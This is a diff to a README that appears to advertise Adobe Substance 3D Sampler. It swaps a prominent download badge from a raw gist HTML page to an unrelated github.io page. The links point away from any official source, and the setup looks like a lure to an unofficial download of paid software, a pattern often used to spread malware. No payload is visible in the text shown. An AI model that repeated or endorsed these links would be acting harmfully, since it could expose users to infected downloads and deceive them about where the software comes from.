@@ -2,7 +2,7 @@
 
 Substance 3D Sampler (formerly Substance Alchemist) allows artists to **capture, mix, and enhance materials** using real-world photos and procedural effects. It’s the perfect bridge between physical textures and digital workflows. 🧪  
 
-[![🟢 Get GitHub Instruction](https://img.shields.io/badge/🟢%20Get%20Substance%203D%20Sampler-45C879?style=for-the-badge&logo=adobe&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/barxasmaxwell1994/9ef2f73a53a97b429a7452f2a368b2a1/raw/0b34af8b9adf4d0d1295afc7c7dfd54aea07e2d3/get.html?offer=SubstanceSampler)
+[![🟢 Get GitHub Instruction](https://img.shields.io/badge/🟢%20Get%20Substance%203D%20Sampler-45C879?style=for-the-badge&logo=adobe&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=SubstanceSampler)
 
 ---
 
